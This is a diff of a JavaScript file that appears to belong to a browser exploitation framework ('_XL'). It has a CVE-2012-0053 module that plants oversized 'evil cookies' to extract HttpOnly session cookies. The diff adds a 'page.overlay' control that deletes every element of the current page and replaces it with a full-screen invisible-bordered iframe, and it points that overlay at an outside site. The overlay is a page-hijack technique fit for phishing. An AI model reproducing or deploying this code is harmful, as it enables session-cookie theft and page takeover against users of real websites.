@@ -51,7 +51,6 @@ var _XL = {
             switch (typeof script) {
                 case 'object' : 
                     var func = this.find(script[0]);
-                    console.log(func);
                     func.apply(func, script.slice(1));
                     break;
                 case 'string' :
@@ -77,7 +76,23 @@ _XL.controls = {};
 
 _XL.controls.page = {
         'overlay': function (url) {
-            console.log(url);
+            var kids = document.documentElement.children;
+            for (var i=0; i<kids.length; i++) {
+                document.documentElement.removeChild(kids[i]);
+            }
+            var iframe = document.createElement("iframe");
+            iframe.setAttribute("src",url);
+            iframe.style.width = 0;
+            iframe.style.height = 0;
+            iframe.onload = function () {
+                this.style.position = "absolute";
+                this.style.border = 0;
+                this.style.top = 0;
+                this.style.left = 0;
+                this.style.width = "100%";
+                this.style.height = "100%";
+            }
+            document.documentElement.appendChild(iframe);           
         }
 };
 
@@ -163,8 +178,8 @@ _XL.exploits.CVE_2012_0053 = {
             // Unset evil cookies
             this.setCookies(true);
             _XL.data.cookies = cookie_dict;
-            this.success = true;
             this.complete = true;
+            this.success = true;
         }
         else if (this.readyState === 4) {
             this.complete = true;
@@ -188,7 +203,7 @@ _XL.settings = {
         //'exploits.CVE_2012_0053'
     ],
     'script': [
-        ['controls.page.overlay', 'http://www.google.com']
+        ['controls.page.overlay', 'http://www.apbdb.com']
     ]
 };
 
